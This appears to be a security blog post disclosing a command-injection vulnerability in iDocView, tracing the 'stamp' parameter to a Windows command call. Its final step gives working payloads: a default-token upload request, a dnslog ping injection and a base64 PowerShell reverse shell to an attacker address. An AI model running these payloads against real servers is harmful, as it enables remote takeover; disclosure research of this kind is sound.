

[# zer0\_c|imb's blog](/)

* [首页](/)
* [关于](/about/)
* [标签](/tags/)
* [分类](/categories/)
* [归档](/archives/)
* 搜索

* 文章目录
* 站点概览

1. 1. idocv Version: 14.1.3\_20231228 Command execution
   1. [1.1. Vulnerability Type :](#Vulnerability-Type)
   2. [1.2. Vulnerability Version :](#Vulnerability-Version)
   3. [1.3. Recurring environment:](#Recurring-environment)
   4. [1.4. Vulnerability Description AND recurrence:](#Vulnerability-Description-AND-recurrence)

![zer0_c|imb](/imgss/touxiang.jpg)

zer0\_c|imb

忘川河畔彼岸花，红如鲜血似朱砂

[98
日志](/archives/)

[16
分类](/categories/)

[40
标签](/tags/)

E-Mail

QQ

友情链接

* [ch4ser](http://www.ch4ser.top/ "http://www.ch4ser.top/")
* [Gu](http://hackergu.com/ "http://hackergu.com/")
* [al0neranger](https://al0neranger.github.io/ "https://al0neranger.github.io/")
* [lyshark](https://www.cnblogs.com/lyshark "https://www.cnblogs.com/lyshark")

0%

Theme NexT works best with JavaScript enabled

# 'idocv <= Version: 14.1.3\_20231228 Command execution'

**⬆置顶**
|

发表于
2024-01-18

更新于
2024-02-15

阅读次数：

# idocv Version: 14.1.3\_20231228 Command execution

## Vulnerability Type :

Command execution

## Vulnerability Version :

iDocView < 14.1.3\_20231228

## Recurring environment:

* Windows server 2012
* idocv Version: 13.9.2\_20230914

  (Although the Version: 13.9.2\_20230914 was used during testing, after verification, it has been confirmed that it can attack the latest version 14.1.3\_20231228.)
* IDOCV CMS comes with built-in JDK, Tomcat, and Apache

![](/imgss/idocv_1.jpg)

## Vulnerability Description AND recurrence:

1、The current version is Version: 13.9.2\_20230914

![](/imgss/idocv_2.png)

2、

Using the keyword search, I found the ProcessBuilder() function in the /com/idocv/docview/util/CmdUtil.class file, Here two functions call ProcessBuilder() respectively runWindowsCmd and runLinux, where the The runLiunx function is not used, I can’t find any function that calls runLiunx() through idea’s Find Usages function.

The runWindowsCmd function is clear, pass in the cmd string variable, precede this variable with “cmd /c” to perform a regular match on each of the array index parameters in it, matching to this matches(“. \*["'&()^<>]. \*”) is replaced with null.

![](/imgss/idocv_runWindowsCmd.png)

3、Finding calls through idea’s “Find Usages” function. To see which function calls the runWindowsCmd function.Finally only found the intermediate function runWindowsCmd, he first checked the cmd character array is empty, the use of for loop on the data elements in the processing, after processing the elements of the arrayList2 reorganization into the arrayList, and then convert the “arrayList” to an array of strings and pass it to the runWindowsCmd function.

![](/imgss/idocv_runWindows.png)

4、To see which function calls the runWindows function. As you can see, many functions call the runWindows function, but most of the parameters are not controllable, for example, the url parameter of the toWord function in the HtmlController can not be passed directly or indirectly to the runWindows function.

![](/imgss/idocv_find_usages_runWindows.png)

5、Finally in /com/idocv/docview/service/impl/ViewServiceImpl.class to find convertWord2PdfStamp function, his “stamp” parameter can be controlled, and after a simple replacement on the pass to the runWindows function.There is no need to explain this parameter much here. the “stamp” parameter will be determined by isNotBlank to be null, and if it is not null, then go to line 392 for else, replaceAll for a simple replacement of “stamp”.

![](/imgss/idocv_wordconvertPdf.png)

6、Continuing to look for the convertWord2PdfStamp function, find the route /doc/{uuid}/pdf downloadPdfByUuid function, which calls the convertWord2PdfStamp function and passes the “stamp” variable directly into the parameter without any filtering.

![](/imgss/idocv_downloadPdf.png)

7、Finally is the acquisition of uuid, according to the history of loopholes / doc / upload any file to read, but see the use of the default token to upload files to get uuid, view the route, after testing only need to use the default token to pass in the base64 file content and file name to get uuid.

![](/imgss/idocv_upload_get_uuid_1.png)

![](/imgss/idocv_upload_get_uuid_2.png)

8、Final process and payload

Use the default token value of “testtoken” to request the upload interface to upload a doc file and get the uuid.

| ``` 1 ``` | ``` http://192.168.31.82:8168/doc/upload?token=testtoken&base64=dGVzdCBkb2MgYmFzZTY0IGZpbGU=&name=test.doc ``` |
| --- | --- |

![](/imgss/idocv_get_uuid.png)

![](/imgss/idocv_get_uuid_payload.png)

| ``` 123456789101112131415161718 ``` | ``` POST /doc/XTztMdw/pdf HTTP/1.1Host: 192.168.31.82:8168User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybqxUi1Kl0w9VOsUAAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheContent-Length: 199------WebKitFormBoundarybqxUi1Kl0w9VOsUAContent-Disposition: form-data; name="stamp"xQKBbVw|ping%CommonProgramFiles:~10,-18%222.6d80ddf6.dnslog.store||------WebKitFormBoundarybqxUi1Kl0w9VOsUA ``` |
| --- | --- |

![](/imgss/idocv_commandExec_dnslog_payload.png)

<https://gksec.com/tools/reverse-shell-generator/>

| ``` 1 ``` | ``` xQKBbVw|powershell%CommonProgramFiles:~10,-18%-e%CommonProgramFiles:~10,-18%JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADMAMQAuADEAMgAxACIALAAzADMAMAAzADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA|| ``` |
| --- | --- |

![](/imgss/idocv_commandExec_powershell_payload.png)

[# CVE](/tags/CVE/)

['Java任意文件写-springboot'](/2022/12/09/java%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99-springboot/ "'Java任意文件写-springboot'")

©
2024

zer0\_c|imb

由 [Hexo](https://hexo.io/) & [NexT.Gemini](https://theme-next.js.org/) 强力驱动

